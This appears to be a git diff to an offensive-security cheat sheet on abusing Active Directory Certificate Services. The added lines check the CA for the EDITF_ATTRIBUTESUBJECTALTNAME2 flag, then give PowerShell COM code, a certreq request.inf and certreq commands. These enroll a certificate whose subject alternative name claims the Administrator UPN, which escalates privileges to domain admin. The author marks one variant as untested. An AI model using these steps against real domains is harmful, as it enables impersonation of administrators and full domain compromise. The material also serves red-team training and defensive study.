@@ -64,6 +64,14 @@ Export-PfxCertificate -Cert $certificate -FilePath key.pfx -Password $pw
 
 The extracted private key also can be used with Rubeus \(see [here](https://github.com/GhostPack/Rubeus)\)
 
+### Enumerating the CA servers local policy
+
+```text
+certutil -getreg policy\editflags
+```
+
+If you find that `EDITF_ATTRIBUTESUBJECTALTNAME2` is set as a flag, you can skip the exploitation step and go right into privilege escalation, since this allows anyone to set a User Principal Name \(UPN\) for any certificate template in the active directory.
+
 ## Exploitation / Modification
 
 ### Abusing write access on a certificate template
@@ -124,7 +132,11 @@ Using a certificate to authenticate as a privileged principal with PKINIT. There
 
 when escalating privileges with the UPN, we need \(to enroll\) a certificate with the `subject alternative name`set to our target.
 
+
+
 #### Setting the subject alternative name and enrolling a certificate
+
+**Powershell**
 
 ```text
 # Create a com object and set the subject alternative name
@@ -137,13 +149,55 @@ $SAN.InitializeEncode($IANs)
 
 # Create a request object to request the certificate based on a template
 $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
-$Request.InitializeFromTemplateName(0x1,"TemplateName")
+$Request.InitializeFromTemplateName(0x1,"TemplateName") # Template to use
 $Request.Request.X509Extensions.Add($SAN)
-$Request.CertificateFriendlyName = "TemplateName"
+$Request.CertificateFriendlyName = "TemplateName" # Template to use
 
 # Enroll the certificate
 $Request.Enroll()
 ```
+
+> this already should be configured to abuse `EDITF_ATTRIBUTESUBJECTALTNAME2` you need to modify `$IAN.InitializeFromString(0xB,"Administrator")` \(Not tested\)
+
+**CertReq**
+
+request.inf \([template](https://skanthak.homepage.t-online.de/certificate.html)\)
+
+```text
+[NewRequest]
+Subject = "CN=ComputerName,CN=Computers,DC=domain,DC=local"
+Exportable = TRUE
+KeyLength = 2048
+KeySpec = 1
+KeyUsage = 0x60
+MachineKeySet = FALSE
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+[RequestAttributes]
+CertificateTemplate=Web
+SAN="upn=Administrator" ;or upn=Administrator@domain.local
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "upn=Administrator" ;or upn=Administrator@domain.local
+[EnhancedKeyUsageExtension]
+OID = 1.3.6.1.4.1.311.20.2.2
+OID = 1.3.6.1.5.5.7.3.2
+```
+
+> to abuse `EDITF_ATTRIBUTESUBJECTALTNAME2` you need to modify `SAN="upn=Administrator"`
+
+commands
+
+```text
+certreq -q -new request.inf request.pem
+certreq -q -submit request.pem cert.pem
+certreq -q -accept cert.pem
+```
+
+1. create a `-new` certificate request from given policy file
+2. `-Submit` the generated `request.pem` to the certificate authority
+3. `-Accept` and install the response of the certificate authority
+
+
 
 #### Using an existing certificate
 
